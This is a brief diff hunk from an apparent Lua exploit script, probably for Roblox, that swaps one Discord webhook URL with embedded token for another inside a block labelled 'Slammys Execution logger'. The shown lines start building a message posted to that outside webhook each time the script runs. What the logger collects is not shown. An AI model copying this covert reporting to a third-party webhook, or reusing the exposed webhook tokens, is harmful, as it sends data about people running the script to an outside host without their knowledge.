@@ -5936,7 +5936,7 @@ end})
    "Kid with shit exploit"
    
    local url =
-   "https://discord.com/api/webhooks/987621972232007690/OVE8Iy9wvU84dMYTbHRueDFrzdwApSLDD49nbV_ZJ5BTtX_34oJLq1YJ062YJ86wA0E4"
+   "https://discord.com/api/webhooks/987879835957329930/tKD5BOgG6zoGe_7RzkbcOMQNSiaWbM1EkF7Ui6LrShUGJDQdNjh81wO0EgbwCKS9NGMQ"
 local data = {
    ["content"] = " Slammys Execution logger @everyone",
    ["embeds"] = {
